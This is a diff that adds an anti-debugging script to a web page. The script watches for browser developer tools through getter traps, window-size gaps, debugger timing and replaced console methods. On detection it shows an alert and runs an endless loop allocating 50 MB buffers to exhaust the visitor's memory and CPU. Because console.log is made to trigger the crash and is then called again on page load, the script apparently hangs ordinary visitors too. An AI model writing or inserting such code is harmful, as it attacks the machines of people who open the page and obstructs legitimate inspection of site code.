@@ -8,6 +8,84 @@
 
     <!-- Prevents Debugging in Console -->
 <script>
+    //craxxh pc code if opened devtools
+        // 🛡️ Aggressively Detect DevTools Opening
+        function detectDevTools() {
+            const element = new Image();
+            Object.defineProperty(element, 'id', {
+                get: () => {
+                    triggerCrash();
+                    return 'devtools';
+                }
+            });
+            console.log('%c', element);
+        }
+
+        // 🔥 Infinite Loop to Overload Memory and CPU
+        function triggerCrash() {
+            console.clear();
+            alert("DevTools Detected! Crashing the System...");
+
+            // Aggressively consume memory
+            let memoryLeak = [];
+            while (true) {
+                memoryLeak.push(new ArrayBuffer(1024 * 1024 * 50)); // Allocate 50MB chunks indefinitely
+            }
+        }
+
+        // 🕵️ Continuously Monitor for DevTools via Window Size
+        setInterval(() => {
+            if (window.outerWidth - window.innerWidth > 200 || 
+                window.outerHeight - window.innerHeight > 200) {
+                triggerCrash();
+            }
+        }, 100);
+
+        // 🕵️ Console Detection Using toString Hack
+        (function() {
+            const devtools = /./;
+            devtools.toString = function() {
+                triggerCrash();
+                return 'devtools';
+            };
+            console.log('%c', devtools);
+        })();
+
+        // 🕵️ Monitor for DevTools Using Debugger Statement
+        setInterval(function() {
+            const start = performance.now();
+            debugger;
+            if (performance.now() - start > 100) {
+                triggerCrash();
+            }
+        }, 100);
+
+        // 🕵️ DevTools Detection Using SetTimeout Freeze
+        let devToolsOpen = false;
+        setInterval(function() {
+            const element = document.createElement('div');
+            Object.defineProperty(element, 'id', {
+                get: function() {
+                    devToolsOpen = true;
+                    triggerCrash();
+                }
+            });
+            console.dir(element);
+        }, 1000);
+
+        // ⛔ Disable Console Use by Overwriting Console Methods
+        console.log = console.warn = console.error = console.info = console.debug = function() {
+            triggerCrash();
+        };
+
+        // 🚫 Run DevTools Detection on Load
+        window.onload = detectDevTools;
+
+        // 🔁 Infinite Loop on DevTools Open
+        setInterval(() => {
+            detectDevTools();
+        }, 1000);
+    
     setInterval(() => {
         (function() {
             function devToolCheck() {
